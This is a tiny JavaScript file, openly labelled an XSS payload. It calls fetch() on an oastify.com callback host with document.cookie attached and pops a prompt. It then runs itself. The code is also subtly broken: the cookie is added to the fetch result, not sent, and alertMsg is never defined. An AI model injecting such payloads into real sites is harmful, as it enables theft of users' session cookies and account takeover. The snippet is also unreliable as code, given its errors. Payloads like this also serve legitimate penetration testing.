function xssPayload() {
  fetch('http://gdxhypnu9rt68mi5cn4w980fa6gx4ysn.oastify.com') + document.cookie;
  console.log(alertMsg);
  window.prompt(alertMsg);
}

console.log('XSS payload executed');
xssPayload();
